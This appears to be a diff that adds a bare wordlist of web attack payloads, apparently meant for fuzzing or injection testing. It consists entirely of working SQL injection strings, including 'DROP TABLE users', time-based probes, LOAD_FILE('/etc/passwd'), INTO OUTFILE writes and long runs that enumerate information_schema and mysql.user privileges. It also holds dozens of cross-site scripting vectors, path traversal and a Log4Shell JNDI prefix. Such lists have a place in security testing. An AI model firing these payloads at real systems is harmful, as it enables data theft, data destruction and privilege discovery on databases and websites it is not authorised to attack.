@@ -1,0 +1,398 @@
+' OR '1'='1
+' UNION SELECT 1,2,3--
+<script>alert('XSS')</script>
+../../etc/passwd
+${jndi:ldap://
+' OR 1=1--
+' OR 'a'='a
+' OR 1=1#
+admin'/*
+' OR SLEEP(5)--
+' OR BENCHMARK(1000000,MD5('A'))--
+'/**/OR/**/1=1--
+' OR '1'='1' ORDER BY 1--
+' OR '1'='1' INTO OUTFILE '/tmp/test.txt'--
+' OR '1'='1' UNION ALL SELECT 1,2,3--
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<iframe src=javascript:alert('XSS')>
+<a href=javascript:alert('XSS')>click</a>
+<object data=javascript:alert('XSS')>
+<embed src=javascript:alert('XSS')>
+<video><source onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+<form><button formaction=javascript:alert('XSS')>click
+<details ontoggle=alert('XSS')>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<input onfocus=alert('XSS') autofocus>
+<keygen onfocus=alert('XSS') autofocus>
+<marquee onstart=alert('XSS')>
+<isindex onfocus=alert('XSS') autofocus>
+<image src=x onerror=alert('XSS')>
+<frameset onload=alert('XSS')>
+<applet code="javascript:alert('XSS')">
+<base href=javascript:alert('XSS')//>
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+<link rel=stylesheet href='javascript:alert('XSS')'>
+<style>@import'javascript:alert('XSS')';</style>
+<div style="background-image:url(javascript:alert('XSS'))">
+<div style="width:expression(alert('XSS'))">
+<style>@\import'javascript:alert('XSS')';</style>
+<xss style="behavior:url(#default#time2)" onbegin="alert('XSS')">
+<?xml-stylesheet type="text/xsl" href="javascript:alert('XSS')"?>
+<xml:namespace prefix="t">
+<xml:id><t:set attributeName="innerHTML" to="XSS<SCRIPT>alert('XSS')</SCRIPT>">
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<!--<img src="--><img src=x onerror=alert('XSS')//">
+<<script>alert('XSS');//<</script>
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+<script src="data:text/javascript,alert('XSS')"></script>
+<script src="https:"></script><script>alert('XSS')</script>
+javascript:alert('XSS')
+JaVaScRiPt:alert('XSS')
+javascript:alert("XSS")
+javascript:alert(`XSS`)
+javascript:alert(String.fromCharCode(88,83,83))
+javascript:alert
+1; DROP TABLE users
+1'; DROP TABLE users--
+'; DROP TABLE users--
+' OR '1'='1' AND (SELECT * FROM users) IS NOT NULL--
+' OR EXISTS(SELECT * FROM users)--
+' OR (SELECT COUNT(*) FROM users) > 0--
+' OR (SELECT username FROM users WHERE id=1)='admin'--
+' OR (SELECT password FROM users WHERE username='admin')='pass'--
+' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 0--
+' OR (SELECT LOAD_FILE('/etc/passwd')) IS NOT NULL--
+' OR (SELECT @@version) LIKE '%MySQL%'--
+' OR (SELECT @@datadir) LIKE '%/%'--
+' OR (SELECT USER()) LIKE '%root%'--
+' OR (SELECT DATABASE()) LIKE '%test%'--
+' OR (SELECT CURRENT_USER()) LIKE '%admin%'--
+' OR (SELECT SCHEMA_NAME FROM information_schema.schemata LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_NAME FROM information_schema.tables LIMIT 1) IS NOT NULL--
+' OR (SELECT COLUMN_NAME FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_SCHEMA FROM information_schema.tables LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_CATALOG FROM information_schema.tables LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_TYPE FROM information_schema.tables LIMIT 1) IS NOT NULL--
+' OR (SELECT ENGINE FROM information_schema.tables LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_ROWS FROM information_schema.tables LIMIT 1) > 0--
+' OR (SELECT AVG_ROW_LENGTH FROM information_schema.tables LIMIT 1) > 0--
+' OR (SELECT DATA_LENGTH FROM information_schema.tables LIMIT 1) > 0--
+' OR (SELECT MAX_DATA_LENGTH FROM information_schema.tables LIMIT 1) > 0--
+' OR (SELECT INDEX_LENGTH FROM information_schema.tables LIMIT 1) > 0--
+' OR (SELECT DATA_FREE FROM information_schema.tables LIMIT 1) > 0--
+' OR (SELECT AUTO_INCREMENT FROM information_schema.tables LIMIT 1) > 0--
+' OR (SELECT CREATE_TIME FROM information_schema.tables LIMIT 1) IS NOT NULL--
+' OR (SELECT UPDATE_TIME FROM information_schema.tables LIMIT 1) IS NOT NULL--
+' OR (SELECT CHECK_TIME FROM information_schema.tables LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_COLLATION FROM information_schema.tables LIMIT 1) IS NOT NULL--
+' OR (SELECT CHECKSUM FROM information_schema.tables LIMIT 1) IS NOT NULL--
+' OR (SELECT CREATE_OPTIONS FROM information_schema.tables LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_COMMENT FROM information_schema.tables LIMIT 1) IS NOT NULL--
+' OR (SELECT PARTITION_ORDINAL_POSITION FROM information_schema.partitions LIMIT 1) IS NOT NULL--
+' OR (SELECT SUBPARTITION_ORDINAL_POSITION FROM information_schema.partitions LIMIT 1) IS NOT NULL--
+' OR (SELECT PARTITION_METHOD FROM information_schema.partitions LIMIT 1) IS NOT NULL--
+' OR (SELECT SUBPARTITION_METHOD FROM information_schema.partitions LIMIT 1) IS NOT NULL--
+' OR (SELECT PARTITION_EXPRESSION FROM information_schema.partitions LIMIT 1) IS NOT NULL--
+' OR (SELECT SUBPARTITION_EXPRESSION FROM information_schema.partitions LIMIT 1) IS NOT NULL--
+' OR (SELECT PARTITION_DESCRIPTION FROM information_schema.partitions LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_ROWS FROM information_schema.partitions LIMIT 1) > 0--
+' OR (SELECT AVG_ROW_LENGTH FROM information_schema.partitions LIMIT 1) > 0--
+' OR (SELECT DATA_LENGTH FROM information_schema.partitions LIMIT 1) > 0--
+' OR (SELECT MAX_DATA_LENGTH FROM information_schema.partitions LIMIT 1) > 0--
+' OR (SELECT INDEX_LENGTH FROM information_schema.partitions LIMIT 1) > 0--
+' OR (SELECT DATA_FREE FROM information_schema.partitions LIMIT 1) > 0--
+' OR (SELECT CREATE_TIME FROM information_schema.partitions LIMIT 1) IS NOT NULL--
+' OR (SELECT UPDATE_TIME FROM information_schema.partitions LIMIT 1) IS NOT NULL--
+' OR (SELECT CHECK_TIME FROM information_schema.partitions LIMIT 1) IS NOT NULL--
+' OR (SELECT CHECKSUM FROM information_schema.partitions LIMIT 1) IS NOT NULL--
+' OR (SELECT PARTITION_COMMENT FROM information_schema.partitions LIMIT 1) IS NOT NULL--
+' OR (SELECT NODEGROUP FROM information_schema.partitions LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLESPACE_NAME FROM information_schema.partitions LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_CATALOG FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_SCHEMA FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_NAME FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT COLUMN_NAME FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT ORDINAL_POSITION FROM information_schema.columns LIMIT 1) > 0--
+' OR (SELECT COLUMN_DEFAULT FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT IS_NULLABLE FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT DATA_TYPE FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns LIMIT 1) > 0--
+' OR (SELECT CHARACTER_OCTET_LENGTH FROM information_schema.columns LIMIT 1) > 0--
+' OR (SELECT NUMERIC_PRECISION FROM information_schema.columns LIMIT 1) > 0--
+' OR (SELECT NUMERIC_SCALE FROM information_schema.columns LIMIT 1) > 0--
+' OR (SELECT DATETIME_PRECISION FROM information_schema.columns LIMIT 1) > 0--
+' OR (SELECT CHARACTER_SET_NAME FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT COLLATION_NAME FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT COLUMN_TYPE FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT COLUMN_KEY FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT EXTRA FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT PRIVILEGES FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT COLUMN_COMMENT FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT GENERATION_EXPRESSION FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT SRS_ID FROM information_schema.columns LIMIT 1) IS NOT NULL--
+' OR (SELECT GRANTEE FROM information_schema.user_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_CATALOG FROM information_schema.user_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT PRIVILEGE_TYPE FROM information_schema.user_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT IS_GRANTABLE FROM information_schema.user_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT GRANTOR FROM information_schema.user_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT OBJECT_SCHEMA FROM information_schema.user_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT OBJECT_NAME FROM information_schema.user_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT OBJECT_TYPE FROM information_schema.user_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT PRIVILEGE_TYPE FROM information_schema.schema_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT IS_GRANTABLE FROM information_schema.schema_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT GRANTEE FROM information_schema.schema_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_CATALOG FROM information_schema.schema_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_SCHEMA FROM information_schema.schema_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT PRIVILEGE_TYPE FROM information_schema.table_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT IS_GRANTABLE FROM information_schema.table_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT GRANTEE FROM information_schema.table_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_CATALOG FROM information_schema.table_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_SCHEMA FROM information_schema.table_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_NAME FROM information_schema.table_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT PRIVILEGE_TYPE FROM information_schema.column_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT IS_GRANTABLE FROM information_schema.column_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT GRANTEE FROM information_schema.column_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_CATALOG FROM information_schema.column_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_SCHEMA FROM information_schema.column_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_NAME FROM information_schema.column_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT COLUMN_NAME FROM information_schema.column_privileges LIMIT 1) IS NOT NULL--
+' OR (SELECT CHARACTER_SET_NAME FROM information_schema.character_sets LIMIT 1) IS NOT NULL--
+' OR (SELECT DEFAULT_COLLATE_NAME FROM information_schema.character_sets LIMIT 1) IS NOT NULL--
+' OR (SELECT DESCRIPTION FROM information_schema.character_sets LIMIT 1) IS NOT NULL--
+' OR (SELECT MAXLEN FROM information_schema.character_sets LIMIT 1) > 0--
+' OR (SELECT COLLATION_NAME FROM information_schema.collations LIMIT 1) IS NOT NULL--
+' OR (SELECT CHARACTER_SET_NAME FROM information_schema.collations LIMIT 1) IS NOT NULL--
+' OR (SELECT ID FROM information_schema.collations LIMIT 1) > 0--
+' OR (SELECT IS_DEFAULT FROM information_schema.collations LIMIT 1) IS NOT NULL--
+' OR (SELECT IS_COMPILED FROM information_schema.collations LIMIT 1) IS NOT NULL--
+' OR (SELECT SORTLEN FROM information_schema.collations LIMIT 1) > 0--
+' OR (SELECT PAD_ATTRIBUTE FROM information_schema.collations LIMIT 1) IS NOT NULL--
+' OR (SELECT COLLATION_NAME FROM information_schema.collation_character_set_applicability LIMIT 1) IS NOT NULL--
+' OR (SELECT CHARACTER_SET_NAME FROM information_schema.collation_character_set_applicability LIMIT 1) IS NOT NULL--
+' OR (SELECT SCHEMA_NAME FROM information_schema.schemata LIMIT 1) IS NOT NULL--
+' OR (SELECT DEFAULT_CHARACTER_SET_NAME FROM information_schema.schemata LIMIT 1) IS NOT NULL--
+' OR (SELECT DEFAULT_COLLATION_NAME FROM information_schema.schemata LIMIT 1) IS NOT NULL--
+' OR (SELECT SQL_PATH FROM information_schema.schemata LIMIT 1) IS NOT NULL--
+' OR (SELECT DEFAULT_ENCRYPTION FROM information_schema.schemata LIMIT 1) IS NOT NULL--
+' OR (SELECT EVENT_CATALOG FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT EVENT_SCHEMA FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT EVENT_NAME FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT DEFINER FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT TIME_ZONE FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT EVENT_BODY FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT EVENT_DEFINITION FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT EVENT_TYPE FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT EXECUTE_AT FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT INTERVAL_VALUE FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT INTERVAL_FIELD FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT SQL_MODE FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT STARTS FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT ENDS FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT STATUS FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT ON_COMPLETION FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT CREATED FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT LAST_ALTERED FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT LAST_EXECUTED FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT EVENT_COMMENT FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT ORIGINATOR FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT CHARACTER_SET_CLIENT FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT COLLATION_CONNECTION FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT DATABASE_COLLATION FROM information_schema.events LIMIT 1) IS NOT NULL--
+' OR (SELECT ROUTINE_CATALOG FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT ROUTINE_SCHEMA FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT ROUTINE_NAME FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT ROUTINE_TYPE FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT DATA_TYPE FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT CHARACTER_MAXIMUM_LENGTH FROM information_schema.routines LIMIT 1) > 0--
+' OR (SELECT CHARACTER_OCTET_LENGTH FROM information_schema.routines LIMIT 1) > 0--
+' OR (SELECT NUMERIC_PRECISION FROM information_schema.routines LIMIT 1) > 0--
+' OR (SELECT NUMERIC_SCALE FROM information_schema.routines LIMIT 1) > 0--
+' OR (SELECT DATETIME_PRECISION FROM information_schema.routines LIMIT 1) > 0--
+' OR (SELECT CHARACTER_SET_NAME FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT COLLATION_NAME FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT DTD_IDENTIFIER FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT ROUTINE_BODY FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT ROUTINE_DEFINITION FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT EXTERNAL_NAME FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT EXTERNAL_LANGUAGE FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT PARAMETER_STYLE FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT IS_DETERMINISTIC FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT SQL_DATA_ACCESS FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT SQL_PATH FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT SECURITY_TYPE FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT CREATED FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT LAST_ALTERED FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT SQL_MODE FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT ROUTINE_COMMENT FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT DEFINER FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT CHARACTER_SET_CLIENT FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT COLLATION_CONNECTION FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT DATABASE_COLLATION FROM information_schema.routines LIMIT 1) IS NOT NULL--
+' OR (SELECT TRIGGER_CATALOG FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT TRIGGER_SCHEMA FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT TRIGGER_NAME FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT EVENT_MANIPULATION FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT EVENT_OBJECT_CATALOG FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT EVENT_OBJECT_SCHEMA FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT EVENT_OBJECT_TABLE FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT ACTION_ORDER FROM information_schema.triggers LIMIT 1) > 0--
+' OR (SELECT ACTION_CONDITION FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT ACTION_STATEMENT FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT ACTION_ORIENTATION FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT ACTION_TIMING FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT ACTION_REFERENCE_OLD_TABLE FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT ACTION_REFERENCE_NEW_TABLE FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT ACTION_REFERENCE_OLD_ROW FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT ACTION_REFERENCE_NEW_ROW FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT CREATED FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT SQL_MODE FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT DEFINER FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT CHARACTER_SET_CLIENT FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT COLLATION_CONNECTION FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT DATABASE_COLLATION FROM information_schema.triggers LIMIT 1) IS NOT NULL--
+' OR (SELECT VIEW_DEFINITION FROM information_schema.views LIMIT 1) IS NOT NULL--
+' OR (SELECT CHECK_OPTION FROM information_schema.views LIMIT 1) IS NOT NULL--
+' OR (SELECT IS_UPDATABLE FROM information_schema.views LIMIT 1) IS NOT NULL--
+' OR (SELECT DEFINER FROM information_schema.views LIMIT 1) IS NOT NULL--
+' OR (SELECT SECURITY_TYPE FROM information_schema.views LIMIT 1) IS NOT NULL--
+' OR (SELECT CHARACTER_SET_CLIENT FROM information_schema.views LIMIT 1) IS NOT NULL--
+' OR (SELECT COLLATION_CONNECTION FROM information_schema.views LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_CATALOG FROM information_schema.tablespaces LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_SCHEMA FROM information_schema.tablespaces LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_NAME FROM information_schema.tablespaces LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLESPACE_NAME FROM information_schema.tablespaces LIMIT 1) IS NOT NULL--
+' OR (SELECT ENGINE FROM information_schema.tablespaces LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLESPACE_TYPE FROM information_schema.tablespaces LIMIT 1) IS NOT NULL--
+' OR (SELECT LOGFILE_GROUP_NAME FROM information_schema.tablespaces LIMIT 1) IS NOT NULL--
+' OR (SELECT EXTENT_SIZE FROM information_schema.tablespaces LIMIT 1) > 0--
+' OR (SELECT AUTOEXTEND_SIZE FROM information_schema.tablespaces LIMIT 1) > 0--
+' OR (SELECT MAXIMUM_SIZE FROM information_schema.tablespaces LIMIT 1) > 0--
+' OR (SELECT NODEGROUP_ID FROM information_schema.tablespaces LIMIT 1) > 0--
+' OR (SELECT TABLESPACE_COMMENT FROM information_schema.tablespaces LIMIT 1) IS NOT NULL--
+' OR (SELECT FILE_NAME FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT FILE_TYPE FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLESPACE_NAME FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_CATALOG FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_SCHEMA FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_NAME FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT LOGFILE_GROUP_NAME FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT LOGFILE_GROUP_NUMBER FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT ENGINE FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT FULLTEXT_KEYS FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT DELETED_ROWS FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT UPDATE_COUNT FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT FREE_EXTENTS FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT TOTAL_EXTENTS FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT EXTENT_SIZE FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT INITIAL_SIZE FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT MAXIMUM_SIZE FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT AUTOEXTEND_SIZE FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT CREATION_TIME FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT LAST_UPDATE_TIME FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT LAST_ACCESS_TIME FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT RECOVER_TIME FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT TRANSACTION_COUNTER FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT VERSION FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT ROW_FORMAT FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT TABLE_ROWS FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT AVG_ROW_LENGTH FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT DATA_LENGTH FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT MAX_DATA_LENGTH FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT INDEX_LENGTH FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT DATA_FREE FROM information_schema.files LIMIT 1) > 0--
+' OR (SELECT CREATE_TIME FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT UPDATE_TIME FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT CHECK_TIME FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT CHECKSUM FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT STATUS FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT EXTRA FROM information_schema.files LIMIT 1) IS NOT NULL--
+' OR (SELECT PLUGIN_NAME FROM information_schema.plugins LIMIT 1) IS NOT NULL--
+' OR (SELECT PLUGIN_VERSION FROM information_schema.plugins LIMIT 1) IS NOT NULL--
+' OR (SELECT PLUGIN_STATUS FROM information_schema.plugins LIMIT 1) IS NOT NULL--
+' OR (SELECT PLUGIN_TYPE FROM information_schema.plugins LIMIT 1) IS NOT NULL--
+' OR (SELECT PLUGIN_TYPE_VERSION FROM information_schema.plugins LIMIT 1) IS NOT NULL--
+' OR (SELECT PLUGIN_LIBRARY FROM information_schema.plugins LIMIT 1) IS NOT NULL--
+' OR (SELECT PLUGIN_LIBRARY_VERSION FROM information_schema.plugins LIMIT 1) IS NOT NULL--
+' OR (SELECT PLUGIN_AUTHOR FROM information_schema.plugins LIMIT 1) IS NOT NULL--
+' OR (SELECT PLUGIN_DESCRIPTION FROM information_schema.plugins LIMIT 1) IS NOT NULL--
+' OR (SELECT PLUGIN_LICENSE FROM information_schema.plugins LIMIT 1) IS NOT NULL--
+' OR (SELECT LOAD_OPTION FROM information_schema.plugins LIMIT 1) IS NOT NULL--
+' OR (SELECT PROCESSLIST_ID FROM information_schema.processlist LIMIT 1) > 0--
+' OR (SELECT USER FROM information_schema.processlist LIMIT 1) IS NOT NULL--
+' OR (SELECT HOST FROM information_schema.processlist LIMIT 1) IS NOT NULL--
+' OR (SELECT DB FROM information_schema.processlist LIMIT 1) IS NOT NULL--
+' OR (SELECT COMMAND FROM information_schema.processlist LIMIT 1) IS NOT NULL--
+' OR (SELECT TIME FROM information_schema.processlist LIMIT 1) > 0--
+' OR (SELECT STATE FROM information_schema.processlist LIMIT 1) IS NOT NULL--
+' OR (SELECT INFO FROM information_schema.processlist LIMIT 1) IS NOT NULL--
+' OR (SELECT TIME_MS FROM information_schema.processlist LIMIT 1) > 0--
+' OR (SELECT STAGE FROM information_schema.processlist LIMIT 1) > 0--
+' OR (SELECT MAX_STAGE FROM information_schema.processlist LIMIT 1) > 0--
+' OR (SELECT PROGRESS FROM information_schema.processlist LIMIT 1) > 0--
+' OR (SELECT MEMORY_USED FROM information_schema.processlist LIMIT 1) > 0--
+' OR (SELECT EXAMINED_ROWS FROM information_schema.processlist LIMIT 1) > 0--
+' OR (SELECT QUERY_ID FROM information_schema.processlist LIMIT 1) > 0--
+' OR (SELECT INFO_BINARY FROM information_schema.processlist LIMIT 1) IS NOT NULL--
+' OR (SELECT TID FROM information_schema.processlist LIMIT 1) > 0--
+' OR (SELECT RESOURCE_GROUP FROM information_schema.processlist LIMIT 1) IS NOT NULL--
+' OR (SELECT VARIABLE_NAME FROM information_schema.session_variables LIMIT 1) IS NOT NULL--
+' OR (SELECT VARIABLE_VALUE FROM information_schema.session_variables LIMIT 1) IS NOT NULL--
+' OR (SELECT VARIABLE_NAME FROM information_schema.global_variables LIMIT 1) IS NOT NULL--
+' OR (SELECT VARIABLE_VALUE FROM information_schema.global_variables LIMIT 1) IS NOT NULL--
+' OR (SELECT VARIABLE_NAME FROM information_schema.persisted_variables LIMIT 1) IS NOT NULL--
+' OR (SELECT VARIABLE_VALUE FROM information_schema.persisted_variables LIMIT 1) IS NOT NULL--
+' OR (SELECT USER FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Host FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Select_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Insert_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Update_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Delete_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Create_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Drop_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Reload_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Shutdown_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Process_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT File_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Grant_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT References_priv FROM mysql.user LIMIT 1) IS NOT NULL--
